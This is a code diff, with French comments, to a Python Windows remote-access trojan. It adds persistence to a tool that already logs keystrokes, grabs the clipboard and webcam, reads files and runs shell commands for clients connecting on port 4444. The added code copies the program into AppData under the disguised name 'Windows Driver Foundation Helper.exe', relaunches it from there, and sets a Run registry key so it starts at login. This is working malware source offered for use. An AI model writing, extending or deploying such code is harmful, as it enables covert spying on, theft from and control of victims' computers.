@@ -9,23 +9,78 @@ import threading
 import win32gui
 import win32process
 import psutil
+import sys
+import winreg
+import ctypes
 from pynput import keyboard
 import json
 import pyperclip
-import cv2  # Ajout de OpenCV pour la webcam
-import uuid  # Pour obtenir l'adresse MAC
+import cv2
+import uuid
+import shutil
 
 # Configuration réseau
 host = "0.0.0.0"
 port = 4444
 
+# Chemins pour la persistance
+expected_path = os.path.join(os.getenv('APPDATA'), 'Windows Driver Foundation Helper.exe')
+
 # Obtenir l'adresse MAC du PC
 def get_mac_address():
-    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,8*6,8)][::-1])
+    mac = '-'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,8*6,8)][::-1])
     return mac
 
 # Adresse MAC du PC cible
 mac_address = get_mac_address()
+
+# Fonction pour dupliquer le fichier .exe dans AppData/Roaming
+def duplicate_to_appdata():
+    try:
+        # Obtenir le chemin complet du fichier exécutable actuel
+        current_exe_path = os.path.abspath(sys.argv[0])
+        print(f"[DEBUG] Chemin du fichier actuel: {current_exe_path}")
+        
+        # Générer le chemin de destination dans AppData/Roaming
+        appdata_roaming_path = expected_path
+        print(f"[DEBUG] Chemin de destination: {appdata_roaming_path}")
+        
+        # Vérifier si le fichier existe déjà
+        if os.path.exists(appdata_roaming_path):
+            print(f"[DEBUG] Le fichier existe déjà dans {appdata_roaming_path}")
+            
+            # Option: forcer la copie même si le fichier existe déjà
+            try:
+                shutil.copy2(current_exe_path, appdata_roaming_path)
+                print(f"[+] Script re-copié dans {appdata_roaming_path}")
+            except Exception as copy_error:
+                print(f"[DEBUG] Erreur lors de la re-copie: {copy_error}")
+        else:
+            # Copier le fichier
+            shutil.copy2(current_exe_path, appdata_roaming_path)
+            print(f"[+] Script dupliqué dans {appdata_roaming_path}")
+        
+        # Vérifier que le fichier existe après la copie
+        if os.path.exists(appdata_roaming_path):
+            print(f"[DEBUG] Vérification: le fichier existe maintenant dans {appdata_roaming_path}")
+        else:
+            print(f"[DEBUG] ERREUR: Le fichier n'existe pas dans {appdata_roaming_path} après tentative de copie")
+            
+        return appdata_roaming_path
+    except Exception as e:
+        print(f"[!] Erreur lors de la duplication du fichier : {e}")
+        return None
+
+# Fonction pour ajouter le script au démarrage via la clé de registre
+def add_to_startup(exe_path):
+    try:
+        key_name = "WinHelper"
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
+        winreg.CloseKey(key)
+        print(f"[+] Ajouté au démarrage : {exe_path}")
+    except Exception as e:
+        print(f"[!] Erreur lors de l'ajout au démarrage : {e}")
 
 # Keylogger
 keylog_file = os.path.join(os.environ["APPDATA"], "keylog.json")
@@ -152,6 +207,8 @@ def get_clipboard_content():
         print(f"Erreur presse-papiers : {e}")
         return None
 
+#####################################################################################################################
+
 def list_directory(path):
     try:
         # Vérifie si le répertoire existe
@@ -191,6 +248,8 @@ def read_file(file_path):
         return content
     except Exception as e:
         return f"[!] Erreur lors de la lecture du fichier: {str(e)}"
+
+#####################################################################################################################
 
 async def execute_command(command):
     process = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE, text=True)
@@ -288,16 +347,47 @@ async def handle_client(conn):
     conn.close()
     print("[-] Connexion fermée")
 
+# Fonction principale avec les mécanismes de persistance
 async def main():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind((host, port))
-    s.listen(5)
-    print(f"[*] En attente sur {host}:{port}")
+    # Étape 1: Duplication du fichier dans AppData
+    print("[*] Tentative de duplication...")
+    appdata_exe_path = duplicate_to_appdata()
+    
+    # Étape 2: Vérifier si le script actuel est déjà à l'emplacement attendu
+    current_path = os.path.abspath(sys.argv[0])
+    if current_path.lower() != expected_path.lower():
+        print(f"[*] Exécution depuis {current_path}, différent de {expected_path}")
+        if appdata_exe_path:
+            # Lancer la version dans AppData et quitter ce processus
+            print(f"[*] Lancement de {appdata_exe_path}...")
+            try:
+                sp.Popen([appdata_exe_path], stdout=sp.DEVNULL, stderr=sp.DEVNULL)
+                print("[+] Nouveau processus lancé avec succès")
+            except Exception as e:
+                print(f"[!] Erreur lors du lancement du nouveau processus: {e}")
+            print("[*] Sortie du programme actuel")
+            sys.exit(0)
+    
+    # Si on est déjà dans le bon chemin ou si la duplication a échoué, continuer
+    print("[*] Exécution normale du programme")
 
-    while True:
-        conn, addr = s.accept()
-        print(f"[+] Connexion de {addr[0]}")
-        await handle_client(conn)
+    # Étape 4: Ajouter au démarrage via la clé de registre
+    add_to_startup(expected_path)
+
+    # Étape 5: Configurer et démarrer le serveur socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.bind((host, port))
+        s.listen(5)
+        print(f"[*] En attente sur {host}:{port}")
+
+        while True:
+            conn, addr = s.accept()
+            print(f"[+] Connexion de {addr[0]}")
+            await handle_client(conn)
+    except Exception as e:
+        print(f"[!] Erreur serveur: {e}")
+        s.close()
 
 if __name__ == "__main__":
     asyncio.run(main())
